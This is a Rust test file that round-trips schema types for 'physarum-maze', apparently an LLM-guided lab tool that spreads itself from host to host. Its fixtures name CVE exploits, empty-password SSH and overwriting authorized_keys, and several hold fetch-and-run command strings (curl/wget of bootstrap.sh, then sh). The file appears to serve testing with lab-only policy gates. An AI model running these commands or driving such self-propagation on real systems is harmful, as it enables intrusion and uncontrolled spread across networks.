/// Schema round-trip tests — verify every contract type survives
/// JSON serialisation and deserialisation without loss or panic.
///
/// These tests also validate that the MockLlmClient round-trips through
/// the same pipeline that physarum-maze will use at runtime.
#[cfg(test)]
mod tests {
    use std::net::IpAddr;

    use crate::{
        mock::MockLlmClient,
        policy::{PolicyGate, MAX_ATTEMPTS},
        types::{
            ArtifactType, BootstrapAction, BootstrapPlan, BootstrapStep, DiscoveryQuery,
            EnrichmentCapability, EnrichmentLookupStatus, EnrichmentRequest, EnrichmentResult,
            ExecutionResultSummary, ExpectedResult, ExploitReference, LineageSummary,
            LlmAttemptEvidence, NextAction, OsHint, OsHintSource, PatternFindingSummary,
            PolicyDecision, PolicyRejectionReason, PortScan, PortState, PropagationMethod,
            PropagationMethodClass, PropagationStrategy, RejectedStrategy, SecretRef, SecretSource,
            SshAuth, TransportProtocol,
        },
        LlmClient,
    };

    fn round_trip<T: serde::Serialize + serde::de::DeserializeOwned + std::fmt::Debug>(value: &T) {
        let json = serde_json::to_string(value).expect("serialize failed");
        let back: T = serde_json::from_str(&json).expect("deserialize failed");
        assert_eq!(
            serde_json::to_value(value).unwrap(),
            serde_json::to_value(&back).unwrap(),
            "round-trip mismatch for {}",
            std::any::type_name::<T>()
        );
    }

    // ── PortScan ─────────────────────────────────────────────────────────────

    #[test]
    fn port_scan_round_trip() {
        round_trip(&PortScan {
            port: 80,
            protocol: TransportProtocol::Tcp,
            state: PortState::Open,
            service_guess: Some("http".into()),
            banner: Some("Apache/2.4.49".into()),
            version_hint: Some("2.4.49".into()),
        });
    }

    #[test]
    fn port_scan_minimal_round_trip() {
        round_trip(&PortScan {
            port: 22,
            protocol: TransportProtocol::Tcp,
            state: PortState::Filtered,
            service_guess: None,
            banner: None,
            version_hint: None,
        });
    }

    // ── OsHint ───────────────────────────────────────────────────────────────

    #[test]
    fn os_hint_all_sources_round_trip() {
        for source in [
            OsHintSource::SshBanner,
            OsHintSource::HttpHeader,
            OsHintSource::ServiceBanner,
            OsHintSource::Convention,
        ] {
            round_trip(&OsHint {
                guess: "Linux".into(),
                confidence: 0.8,
                source,
            });
        }
    }

    // ── SecretRef ────────────────────────────────────────────────────────────

    #[test]
    fn secret_ref_round_trip() {
        round_trip(&SecretRef {
            key_id: "sha256:abc123".into(),
            source: SecretSource::RuntimeGenerated,
        });
        round_trip(&SecretRef {
            key_id: "store:key-42".into(),
            source: SecretSource::LocalAgentSecretStore,
        });
    }

    // ── BootstrapAction — all variants ───────────────────────────────────────

    #[test]
    fn bootstrap_action_all_variants_round_trip() {
        round_trip(&BootstrapAction::HttpPost {
            path: "/exploit".into(),
            body: "cmd=id".into(),
            port: None,
            headers: vec![],
            accept_any_response: false,
        });
        round_trip(&BootstrapAction::HttpPost {
            path: "/upload".into(),
            body: "cmd=id".into(),
            port: Some(8080),
            headers: vec![(
                "Content-Type".into(),
                "application/x-www-form-urlencoded".into(),
            )],
            accept_any_response: true,
        });
        round_trip(&BootstrapAction::HttpGet {
            path: "/shell".into(),
            port: None,
        });
        round_trip(&BootstrapAction::HttpGet {
            path: "/probe".into(),
            port: Some(7777),
        });
        round_trip(&BootstrapAction::ScpUpload {
            local_path: "__self__".into(),
            remote_path: "/tmp/physarum/physarum-maze".into(),
            user: Some("root".into()),
        });
        round_trip(&BootstrapAction::ScpUpload {
            local_path: "/explicit/path".into(),
            remote_path: "/tmp/physarum/physarum-maze".into(),
            user: None,
        });
        round_trip(&BootstrapAction::ScpPullFromSource {
            source_ip: "10.0.0.1".into(),
            source_path: "/tmp/physarum-maze".into(),
            dest_path: "/tmp/physarum-maze".into(),
            secret_ref: SecretRef {
                key_id: "sha256:abc123".into(),
                source: SecretSource::RuntimeGenerated,
            },
        });
        round_trip(&BootstrapAction::SshCommand {
            command: "nohup /tmp/physarum/physarum-maze --mode propagated &".into(),
            user: Some("ec2-user".into()),
        });
        round_trip(&BootstrapAction::SshCommand {
            command: "id".into(),
            user: None,
        });
        round_trip(&BootstrapAction::Custom {
            description: "custom action".into(),
        });
        round_trip(&BootstrapAction::FtpModCopy {
            port: Some(21),
            staging_path: "/tmp/physarum_authorized_keys".into(),
            dest_path: "/root/.ssh/authorized_keys".into(),
        });
        round_trip(&BootstrapAction::FtpModCopy {
            port: None,
            staging_path: "/tmp/physarum_authorized_keys".into(),
            dest_path: "/root/.ssh/authorized_keys".into(),
        });
    }

    // ── PropagationStrategy — all method variants ─────────────────────────────

    #[test]
    fn propagation_strategy_ssh_round_trip() {
        round_trip(&PropagationStrategy {
            method: PropagationMethod::Ssh {
                user: "ubuntu".into(),
                auth: SshAuth::EmptyPassword,
            },
            artifact_type: ArtifactType::AgentBinary,
            bootstrap_plan: None,
            confidence: 0.85,
            reasoning_summary: "Port 22 open, empty-password common on lab VMs.".into(),
            preconditions: vec!["Port 22 open".into()],
            validation_check: Some("SSH connection accepted".into()),
            safety_notes: vec!["Lab only".into()],
            enrichment_request: None,
        });
    }

    #[test]
    fn propagation_strategy_http_round_trip() {
        round_trip(&PropagationStrategy {
            method: PropagationMethod::Http {
                path: "/cgi-bin/vulnerable.cgi".into(),
                http_method: crate::types::HttpMethod::Get,
                headers: vec![("User-Agent".into(), "physarum/0.1".into())],
                port: Some(8080),
            },
            artifact_type: ArtifactType::HttpRequest,
            bootstrap_plan: None,
            confidence: 0.75,
            reasoning_summary: "Apache 2.4.49 path traversal via mod_cgi.".into(),
            preconditions: vec![
                "Port 80 open".into(),
                "Apache 2.4.49 banner confirmed".into(),
            ],
            validation_check: Some("HTTP 200 with command output".into()),
            safety_notes: vec!["Lab only".into()],
            enrichment_request: None,
        });
    }

    #[test]
    fn propagation_strategy_exploit_round_trip() {
        round_trip(&PropagationStrategy {
            method: PropagationMethod::Exploit {
                cve: "CVE-2021-41773".into(),
            },
            artifact_type: ArtifactType::Script,
            bootstrap_plan: None,
            confidence: 0.9,
            reasoning_summary: "CVE-2021-41773 path traversal + RCE via mod_cgi.".into(),
            preconditions: vec!["Apache 2.4.49".into(), "mod_cgi active".into()],
            validation_check: None,
            safety_notes: vec!["Exploit disabled by default — lab mode only.".into()],
            enrichment_request: None,
        });
    }

    #[test]
    fn propagation_strategy_no_path_round_trip() {
        round_trip(&PropagationStrategy {
            method: PropagationMethod::NoPath {
                reason: "Only filtered ports found. No viable propagation vector.".into(),
            },
            artifact_type: ArtifactType::None,
            bootstrap_plan: None,
            confidence: 0.95,
            reasoning_summary: "Target unreachable via known methods.".into(),
            preconditions: vec![],
            validation_check: None,
            safety_notes: vec![],
            enrichment_request: None,
        });
    }

    #[test]
    fn propagation_strategy_with_bootstrap_plan_round_trip() {
        round_trip(&PropagationStrategy {
            method: PropagationMethod::Http {
                path: "/cgi-bin/exploit".into(),
                http_method: crate::types::HttpMethod::Post,
                headers: vec![],
                port: Some(80),
            },
            artifact_type: ArtifactType::Script,
            bootstrap_plan: Some(BootstrapPlan {
                steps: vec![
                    BootstrapStep {
                        action: BootstrapAction::HttpPost {
                            path: "/cgi-bin/exploit".into(),
                            body: "cmd=curl+http://10.0.0.1/bootstrap.sh+-o+/tmp/bs.sh".into(),
                            port: Some(80),
                            headers: vec![],
                            accept_any_response: true,
                        },
                        target: "10.0.0.2:80".into(),
                        timeout_ms: 5000,
                        requires_root: false,
                        expected_result: ExpectedResult {
                            success_indicator: "HTTP 200".into(),
                            failure_indicator: Some("HTTP 4xx/5xx".into()),
                        },
                    },
                    BootstrapStep {
                        action: BootstrapAction::ScpPullFromSource {
                            source_ip: "10.0.0.1".into(),
                            source_path: "/tmp/physarum-maze".into(),
                            dest_path: "/tmp/physarum-maze".into(),
                            secret_ref: SecretRef {
                                key_id: "sha256:deadbeef".into(),
                                source: SecretSource::RuntimeGenerated,
                            },
                        },
                        target: "10.0.0.2".into(),
                        timeout_ms: 10000,
                        requires_root: false,
                        expected_result: ExpectedResult {
                            success_indicator: "exit 0".into(),
                            failure_indicator: None,
                        },
                    },
                ],
            }),
            confidence: 0.8,
            reasoning_summary: "RCE via CVE delivers bootstrap, B pulls binary from A.".into(),
            preconditions: vec!["Port 80 open".into(), "Apache 2.4.49 with mod_cgi".into()],
            validation_check: Some("physarum-maze process running on B".into()),
            safety_notes: vec!["Lab only".into()],
            enrichment_request: None,
        });
    }

    // ── DiscoveryQuery round-trip ────────────────────────────────────────────

    #[test]
    fn discovery_query_full_round_trip() {
        round_trip(&DiscoveryQuery {
            target: "10.0.0.2".parse::<IpAddr>().unwrap(),
            ports: vec![
                PortScan {
                    port: 80,
                    protocol: TransportProtocol::Tcp,
                    state: PortState::Open,
                    service_guess: Some("http".into()),
                    banner: Some("Apache/2.4.49".into()),
                    version_hint: Some("2.4.49".into()),
                },
                PortScan {
                    port: 22,
                    protocol: TransportProtocol::Tcp,
                    state: PortState::Filtered,
                    service_guess: None,
                    banner: None,
                    version_hint: None,
                },
            ],
            os_hint: Some(OsHint {
                guess: "Linux".into(),
                confidence: 0.7,
                source: OsHintSource::SshBanner,
            }),
            lineage_summary: LineageSummary {
                node_id: "node-a".into(),
                hop_count: 1,
                current_score: 0.6,
                colonized_count: 1,
            },
            methods_tried: vec!["ssh".into()],
            rejected_strategies: vec![RejectedStrategy {
                attempt_number: 1,
                method_class: PropagationMethodClass::Ssh,
                rejection_reason: PolicyRejectionReason::TargetOutsideAllowedCidr,
                policy_rule: "allowed_cidrs".into(),
                summary: "SSH rejected — target outside CIDR".into(),
            }],
            attempt_number: 2,
            source_ip: Some("10.0.0.1".parse().unwrap()),
            ephemeral_pubkey: Some("ssh-ed25519 AAAA... physarum-ephemeral".into()),
            available_enrichment_capabilities: vec![EnrichmentCapability::ExploitDb],
            enrichment_result: None,
            pattern_findings: vec![
                PatternFindingSummary {
                    check_id: "nginx-server-detect".into(),
                    name: "Nginx Server Detect".into(),
                    severity: "info".into(),
                    confidence: 0.9,
                    matched_summary: "words=['nginx']".into(),
                    extracted: vec!["nginx/1.25.3".into()],
                    is_actionable: false,
                    vulnerability_candidates: vec![],
                },
                PatternFindingSummary {
                    check_id: "server-version-exposed".into(),
                    name: "Server Version Exposed".into(),
                    severity: "low".into(),
                    confidence: 0.85,
                    matched_summary: "regex='^[^ ]+ [0-9]'".into(),
                    extracted: vec!["nginx/1.25.3".into()],
                    is_actionable: true,
                    vulnerability_candidates: vec![],
                },
            ],
        });
    }

    // ── LlmAttemptEvidence round-trip ────────────────────────────────────────

    #[test]
    fn llm_attempt_evidence_round_trip() {
        round_trip(&LlmAttemptEvidence {
            target: "10.0.0.2".into(),
            attempt_number: 1,
            stimulus_source: "startup-sensing".into(),
            method_class: PropagationMethodClass::Http,
            artifact_type: ArtifactType::Script,
            policy_decision: PolicyDecision::Accepted,
            execution_result: ExecutionResultSummary::Success,
            reasoning_summary:
                "nginx/1.18.0 affected by CVE-2021-23017 (CVSS 7.7, MemoryCorruption); \
                 proposing Http propagation on port 80."
                    .into(),
            next_action: NextAction::ContinueOrganismLoop,
            strategy_id: "sha256:cafebabe".into(),
            strategy_confidence: 0.82,
            target_port: Some(80),
            cve_candidate_ids: vec!["CVE-2021-23017".into()],
            enrichment_requested: false,
            exploit_reference_id: None,
        });

        round_trip(&LlmAttemptEvidence {
            target: "10.0.0.3".into(),
            attempt_number: 3,
            stimulus_source: "icmp".into(),
            method_class: PropagationMethodClass::Ssh,
            artifact_type: ArtifactType::None,
            policy_decision: PolicyDecision::Rejected {
                reason: PolicyRejectionReason::ConfidenceBelowThreshold,
                rule: "min_confidence=0.7".into(),
            },
            execution_result: ExecutionResultSummary::Skipped {
                reason: "Policy rejected before execution.".into(),
            },
            reasoning_summary: "SSH confidence too low.".into(),
            next_action: NextAction::RetryWithLlm,
            strategy_id: "sha256:00000000".into(),
            strategy_confidence: 0.45,
            target_port: Some(22),
            cve_candidate_ids: vec![],
            enrichment_requested: false,
            exploit_reference_id: None,
        });

        round_trip(&LlmAttemptEvidence {
            target: "10.0.0.4".into(),
            attempt_number: MAX_ATTEMPTS,
            stimulus_source: "tcp-syn".into(),
            method_class: PropagationMethodClass::NoPath,
            artifact_type: ArtifactType::None,
            policy_decision: PolicyDecision::Accepted,
            execution_result: ExecutionResultSummary::Failed {
                description: "All vectors exhausted.".into(),
            },
            reasoning_summary: "No propagation path found after max attempts.".into(),
            next_action: NextAction::MaxAttemptsReached,
            strategy_id: "sha256:ffffffff".into(),
            strategy_confidence: 0.0,
            target_port: None,
            cve_candidate_ids: vec![],
            enrichment_requested: false,
            exploit_reference_id: None,
        });
    }

    // ── MockLlmClient contract test ──────────────────────────────────────────

    #[tokio::test]
    async fn mock_client_returns_configured_strategy() {
        let client = MockLlmClient::ssh_empty_password("ubuntu", 0.9);

        let query = DiscoveryQuery {
            target: "10.0.0.2".parse().unwrap(),
            ports: vec![],
            os_hint: None,
            lineage_summary: LineageSummary {
                node_id: "a".into(),
                hop_count: 0,
                current_score: 0.0,
                colonized_count: 0,
            },
            methods_tried: vec![],
            rejected_strategies: vec![],
            attempt_number: 1,
            pattern_findings: vec![],
            source_ip: None,
            ephemeral_pubkey: None,
            available_enrichment_capabilities: vec![],
            enrichment_result: None,
        };

        let strategy = client.query_propagation(&query).await.unwrap();
        assert!(matches!(
            strategy.method,
            PropagationMethod::Ssh {
                auth: SshAuth::EmptyPassword,
                ..
            }
        ));
        assert_eq!(strategy.confidence, 0.9);
    }

    #[tokio::test]
    async fn mock_client_no_path() {
        let client = MockLlmClient::no_path("All ports filtered");
        let query = DiscoveryQuery {
            target: "192.168.1.1".parse().unwrap(),
            ports: vec![],
            os_hint: None,
            lineage_summary: LineageSummary {
                node_id: "b".into(),
                hop_count: 1,
                current_score: 0.1,
                colonized_count: 1,
            },
            methods_tried: vec!["ssh".into()],
            rejected_strategies: vec![],
            attempt_number: 2,
            pattern_findings: vec![],
            source_ip: None,
            ephemeral_pubkey: None,
            available_enrichment_capabilities: vec![],
            enrichment_result: None,
        };

        let strategy = client.query_propagation(&query).await.unwrap();
        assert!(matches!(strategy.method, PropagationMethod::NoPath { .. }));
    }

    // ── Policy gate + MockLlmClient integration ──────────────────────────────

    #[tokio::test]
    async fn mock_client_strategy_accepted_by_policy_gate() {
        use std::net::Ipv4Addr;

        let client = MockLlmClient::ssh_empty_password("root", 0.9);
        let query = DiscoveryQuery {
            target: "10.0.1.5".parse().unwrap(),
            ports: vec![],
            os_hint: None,
            lineage_summary: LineageSummary {
                node_id: "a".into(),
                hop_count: 0,
                current_score: 0.0,
                colonized_count: 0,
            },
            methods_tried: vec![],
            rejected_strategies: vec![],
            attempt_number: 1,
            pattern_findings: vec![],
            source_ip: None,
            ephemeral_pubkey: None,
            available_enrichment_capabilities: vec![],
            enrichment_result: None,
        };

        let strategy = client.query_propagation(&query).await.unwrap();

        let gate = PolicyGate {
            allowed_cidrs: vec![("10.0.0.0".parse::<Ipv4Addr>().unwrap(), 8)],
            ..PolicyGate::lab_default()
        };

        assert!(matches!(
            gate.evaluate(&strategy, "10.0.1.5".parse().unwrap(), 1),
            PolicyDecision::Accepted
        ));
    }

    // ── PatternFindingSummary round-trip ─────────────────────────────────────

    #[test]
    fn pattern_finding_summary_actionable_round_trip() {
        round_trip(&PatternFindingSummary {
            check_id: "server-version-exposed".into(),
            name: "Server Version Exposed".into(),
            severity: "low".into(),
            confidence: 0.9,
            matched_summary: "regex='^nginx/[0-9]'".into(),
            extracted: vec!["nginx/1.25.3".into()],
            is_actionable: true,
            vulnerability_candidates: vec![],
        });
    }

    #[test]
    fn pattern_finding_summary_info_round_trip() {
        round_trip(&PatternFindingSummary {
            check_id: "nginx-server-detect".into(),
            name: "Nginx Server Detect".into(),
            severity: "info".into(),
            confidence: 1.0,
            matched_summary: "words=['nginx']".into(),
            extracted: vec![],
            is_actionable: false,
            vulnerability_candidates: vec![],
        });
    }

    #[test]
    fn discovery_query_empty_pattern_findings_omitted_from_json() {
        let q = DiscoveryQuery {
            target: "10.0.0.1".parse::<IpAddr>().unwrap(),
            ports: vec![],
            os_hint: None,
            lineage_summary: LineageSummary {
                node_id: "seed".into(),
                hop_count: 0,
                current_score: 0.0,
                colonized_count: 0,
            },
            methods_tried: vec![],
            rejected_strategies: vec![],
            attempt_number: 1,
            pattern_findings: vec![],
            source_ip: None,
            ephemeral_pubkey: None,
            available_enrichment_capabilities: vec![],
            enrichment_result: None,
        };
        let json = serde_json::to_string(&q).unwrap();
        // Empty pattern_findings must be omitted — backwards compat with v0.3.0 lineage.
        assert!(!json.contains("pattern_findings"));
    }

    #[test]
    fn discovery_query_without_pattern_findings_field_deserialises() {
        // Simulates a v0.3.0 lineage JSON that has no pattern_findings key.
        let json = r#"{
            "target": "10.0.0.1",
            "ports": [],
            "os_hint": null,
            "lineage_summary": { "node_id": "seed", "hop_count": 0, "current_score": 0.0, "colonized_count": 0 },
            "methods_tried": [],
            "rejected_strategies": [],
            "attempt_number": 1
        }"#;
        let q: DiscoveryQuery =
            serde_json::from_str(json).expect("must deserialise without pattern_findings");
        assert!(q.pattern_findings.is_empty());
    }

    // ── Port field backward compat ────────────────────────────────────────────

    #[test]
    fn http_action_without_port_deserialises_to_none() {
        // Pre-PF-4 lineage JSON has no "port" key in HttpGet/HttpPost — must round-trip.
        let json = r#"{"HttpGet":{"path":"/"}}"#;
        let action: BootstrapAction = serde_json::from_str(json).unwrap();
        assert!(matches!(
            action,
            BootstrapAction::HttpGet { port: None, .. }
        ));
    }

    #[test]
    fn http_method_without_port_deserialises_to_none() {
        let json = r#"{"Http":{"path":"/","http_method":"Get","headers":[]}}"#;
        let method: PropagationMethod = serde_json::from_str(json).unwrap();
        assert!(matches!(method, PropagationMethod::Http { port: None, .. }));
    }

    #[test]
    fn http_action_port_serialised_only_when_set() {
        let with_port = BootstrapAction::HttpGet {
            path: "/".into(),
            port: Some(8080),
        };
        let without_port = BootstrapAction::HttpGet {
            path: "/".into(),
            port: None,
        };
        let json_with = serde_json::to_string(&with_port).unwrap();
        let json_without = serde_json::to_string(&without_port).unwrap();
        assert!(json_with.contains("8080"));
        assert!(!json_without.contains("port"));
    }

    // ── OgnlExec round-trip (Issue #144) ─────────────────────────────────────

    #[test]
    fn ognl_exec_action_round_trip() {
        round_trip(&BootstrapAction::OgnlExec {
            commands: vec![
                "wget -q http://10.0.0.1:8001/bootstrap.sh -O /tmp/bootstrap.sh".into(),
                "sh /tmp/bootstrap.sh".into(),
            ],
            port: Some(8080),
            path_prefix: Some("/".into()),
            extra_headers: vec![],
        });
        // Minimal — no optional fields
        round_trip(&BootstrapAction::OgnlExec {
            commands: vec!["id".into()],
            port: None,
            path_prefix: None,
            extra_headers: vec![],
        });
    }

    // ── EnrichmentRequest / EnrichmentResult round-trip (Issue #144) ─────────

    #[test]
    fn enrichment_request_round_trip() {
        round_trip(&EnrichmentRequest {
            source: EnrichmentCapability::ExploitDb,
            cve_id: "CVE-2021-31805".into(),
            reason: "Need to confirm OGNL command-per-request constraint.".into(),
        });
        round_trip(&EnrichmentRequest {
            source: EnrichmentCapability::SearchSploitLocal,
            cve_id: "CVE-2020-17530".into(),
            reason: "Check freemarker.Execute delivery pattern.".into(),
        });
    }

    #[test]
    fn exploit_reference_round_trip() {
        round_trip(&ExploitReference {
            exploit_reference_id: "EDB-51213".into(),
            source: EnrichmentCapability::ExploitDb,
            cve_id: Some("CVE-2021-31805".into()),
            product: Some("Apache Struts".into()),
            version_range: Some("2.0.0 - 2.5.29".into()),
            platform: Some("linux".into()),
            exploit_type: Some("webapps".into()),
            verified_status: true,
            requires_auth: false,
            requires_user_interaction: false,
            requires_outbound_callback: true,
            expected_effect: Some("Remote Code Execution".into()),
            safety_class: Some("lab-only".into()),
            summary: Some("OGNL injection via HTTP; freemarker.Execute; one OS command per request".into()),
        });
    }

    #[test]
    fn enrichment_result_found_round_trip() {
        round_trip(&EnrichmentResult {
            request: EnrichmentRequest {
                source: EnrichmentCapability::ExploitDb,
                cve_id: "CVE-2021-31805".into(),
                reason: "technique confirmation".into(),
            },
            references: vec![ExploitReference {
                exploit_reference_id: "EDB-51213".into(),
                source: EnrichmentCapability::ExploitDb,
                cve_id: Some("CVE-2021-31805".into()),
                product: None,
                version_range: None,
                platform: None,
                exploit_type: None,
                verified_status: false,
                requires_auth: false,
                requires_user_interaction: false,
                requires_outbound_callback: false,
                expected_effect: None,
                safety_class: None,
                summary: None,
            }],
            status: EnrichmentLookupStatus::Found { count: 1 },
        });
        round_trip(&EnrichmentResult {
            request: EnrichmentRequest {
                source: EnrichmentCapability::ExploitDb,
                cve_id: "CVE-9999-00000".into(),
                reason: "test".into(),
            },
            references: vec![],
            status: EnrichmentLookupStatus::NotFound,
        });
    }

    #[test]
    fn propagation_strategy_with_enrichment_request_round_trip() {
        round_trip(&PropagationStrategy {
            method: PropagationMethod::NoPath {
                reason: "requesting Exploit-DB enrichment".into(),
            },
            artifact_type: ArtifactType::None,
            bootstrap_plan: None,
            confidence: 0.0,
            reasoning_summary: "Requesting CVE-2021-31805 technique details.".into(),
            preconditions: vec![],
            validation_check: None,
            safety_notes: vec![],
            enrichment_request: Some(EnrichmentRequest {
                source: EnrichmentCapability::ExploitDb,
                cve_id: "CVE-2021-31805".into(),
                reason: "Need freemarker.Execute command-per-request constraint.".into(),
            }),
        });
    }

    #[test]
    fn policy_gate_accepts_ognl_exec_strategy() {
        use std::net::Ipv4Addr;
        let gate = PolicyGate {
            allowed_cidrs: vec![("172.21.0.0".parse::<Ipv4Addr>().unwrap(), 24)],
            exploit_enabled: true,
            allowed_methods: vec![
                PropagationMethodClass::Ssh,
                PropagationMethodClass::Http,
                PropagationMethodClass::Exploit,
                PropagationMethodClass::NoPath,
            ],
            ..PolicyGate::lab_default()
        };
        let strategy = PropagationStrategy {
            method: PropagationMethod::Exploit {
                cve: "CVE-2021-31805".into(),
            },
            artifact_type: ArtifactType::AgentBinary,
            bootstrap_plan: Some(BootstrapPlan {
                steps: vec![BootstrapStep {
                    action: BootstrapAction::OgnlExec {
                        commands: vec!["wget http://172.21.0.2:8001/bootstrap.sh -O /tmp/b.sh".into()],
                        port: Some(8080),
                        path_prefix: None,
                        extra_headers: vec![],
                    },
                    target: "172.21.0.5".into(),
                    timeout_ms: 10000,
                    requires_root: false,
                    expected_result: ExpectedResult {
                        success_indicator: "OGNL fired".into(),
                        failure_indicator: None,
                    },
                }],
            }),
            confidence: 0.9,
            reasoning_summary: "CVE-2021-31805 OGNL via OgnlExec.".into(),
            preconditions: vec![],
            validation_check: None,
            safety_notes: vec![],
            enrichment_request: None,
        };
        assert!(matches!(
            gate.evaluate(&strategy, "172.21.0.5".parse().unwrap(), 1),
            PolicyDecision::Accepted
        ));
    }
}
